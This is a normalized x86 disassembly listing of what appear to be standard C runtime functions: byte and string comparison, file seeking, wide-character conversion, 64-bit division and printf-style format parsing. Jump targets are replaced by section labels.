mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_20201f8
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_20202c0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_2020308
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_202251a
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_200fb13
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_200fb39
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_202038d
push 0x14
push r--data
call sub_200db54
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_200fb26
and [ eax ] 0x0
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] edi
call sub_200fb13
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_200db99
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_2022591
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_200fb26
mov [ eax ] edi
call sub_200fb13
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2020308
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_202049c
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_20204a6
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_201a99e
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_20204ef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_200fb13
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_200fa90
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_2020553
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_200fb13
mov [ eax ] 0x2a
call sub_200fb13
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_200fb13
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_2013580
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_2013580
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_20206dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push [ ebp + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_20099ee
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push eax
call sub_2020553
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x4 ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_202072d
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push [ ebp + 0xc ]
call sub_201bc5b
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_2020553
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
leave
retn
mov eax [ ebp - 0x4 ]
leave
retn
sub_2020760
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_20207f5
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_200fbfc
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_2020828
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_20207f5
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_202084f
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x238 ] eax
call sub_20099ee
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_200fb13
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
xor eax eax
cmp ebx eax
je r-xdata
push esi
call sub_20134c9
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc ebx
xor eax eax
cmp [ ebp - 0x228 ] eax
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
xor esi esi
cmp [ ebp - 0x240 ] esi
je r-xdata
mov cl dl
sub cl 0x20
cmp cl 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
je r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_20213ff ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_2014595
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x234 ] edi
test edi edi
jge r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_20207f5
jmp r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_20207f5
mov al [ ebx ]
inc ebx
mov [ ebp - 0x23c ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x21c ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x258 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x25c ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x25c ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x224 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_2009d98
